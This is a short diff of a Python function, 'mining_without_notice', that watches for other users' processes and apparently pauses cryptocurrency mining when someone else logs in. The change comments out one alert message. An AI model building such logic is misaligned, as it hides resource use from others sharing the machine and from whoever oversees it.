@@ -58,7 +58,7 @@ def mining_without_notice(mining_url):
         process = ' '.join(x for x in line.split()[11:])
         if user_name in normal_users and user_name != this_user:
             if not any(allowed_process in process for allowed_process in allow_list):
-                print('Someone else logins and running!', user_name, process)
+                # print('Someone else logins and running!', user_name, process)
                 print(line)
                 someone_else_detected = True
                 if mining_is_on:
